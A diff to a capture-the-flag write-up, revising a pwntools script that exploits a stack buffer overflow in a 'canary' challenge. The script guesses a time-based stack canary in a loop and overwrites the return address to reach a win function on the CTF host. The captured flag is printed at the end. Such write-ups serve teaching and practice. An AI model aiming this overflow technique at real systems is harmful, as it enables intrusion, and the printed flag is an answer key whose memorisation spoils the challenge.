@@ -36,55 +36,70 @@ Inside of readin() there is a read that allows for a buffer overflow! But then i
 From there it is a normal ret2win with a canary but the I imported the time library so that I could also get the current timestamp for the canary value. When running remotely sometimes the time would have a slight discrepancy. I solved this by sending it in a loop and adjusting an offset from the original time.
 
 ```python
-#!/usr/bin/env python3 
-import subprocess
+#!/usr/bin/env python3
 import time
 from pwn import *
 
-binary_path = './canary' # exe
-libc_path = ''
-remote_host = 'www.cweaccessionsctf.com'
-remote_port = 1315  # <-- Needs to be a valid integer if using REMOTE
+# target info
+HOST = "www.cweaccessionsctf.com"
+PORT = 1315
 
-context.binary = binary_path
-#context.terminal = ['tmux', 'splitw', '-h']
-elf = context.binary
-#libc = ELF(libc_path)
-rop = ROP(elf)
-#libc = ELF(libc_path)
+# gadgets / offsets
+WIN_ADDR = 0x080491f6
+BUFFER_OFFSET = 72
+PAD_AFTER_CANARY = 12
 
-if args.GDB:
-    p = gdb.debug(binary_path, gdbscript='b *read_in+38')
-elif args.REMOTE:
-    p = remote(remote_host, remote_port)
-else:
-    p = process(binary_path)
+def try_canary(canary):
+    """
+    Open a fresh connection, send the payload with our guessed canary,
+    and return the process object so caller can check its output.
+    """
+    p = remote(HOST, PORT)
+    # if the binary prints a prompt, sync up here:
+    # p.recvuntil(b"Enter your data:") 
 
-def main():
-    win = 0x080491f6
-
-    canary = int(time.time()) + 2
-    print(canary)
-
-    payload = b''
-    payload += b'A' * 72
+    payload  = b"A" * BUFFER_OFFSET
     payload += p32(canary)
-    payload += b'B' * 12
-    payload += p32(win)
+    payload += b"B" * PAD_AFTER_CANARY
+    payload += p32(WIN_ADDR)
 
     p.sendline(payload)
+    return p
 
-    time.sleep(0.15)
+if __name__ == "__main__":
+    # base time—sync with the server’s time() if you can
+    base = int(time.time())
 
-    p.interactive()
+    for i in range(0, 10):
+        guess = base + i
+        log.info(f"[*] attempting canary = 0x{guess:08x}")
+        p = try_canary(guess)
 
-if __name__ == '__main__':
-    
-    main()
+        # give the remote a moment to respond
+        time.sleep(0.1)
+
+        # read whatever comes back
+        try:
+            data = p.recvall(timeout=1)
+        except EOFError:
+            data = b""
+
+        # look for your flag in the output
+        if b"CWE{" in data or b"flag" in data.lower():
+            log.success(f"FOUND! canary=0x{guess:08x}")
+            print(data.decode(errors="ignore"))
+            p.interactive()
+            break
+
+        # if it wasn’t the right canary, close and loop
+        p.close()
+    else:
+        log.error("All attempts failed.")
+
 
 ```
 
 CWE{fly_away_little_canary_TZ4gELYH}
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbNTA0MTQ4NDA2XX0=
+eyJoaXN0b3J5IjpbLTE1MzIyMzkwNjMsNTA0MTQ4NDA2XX0=
 -->
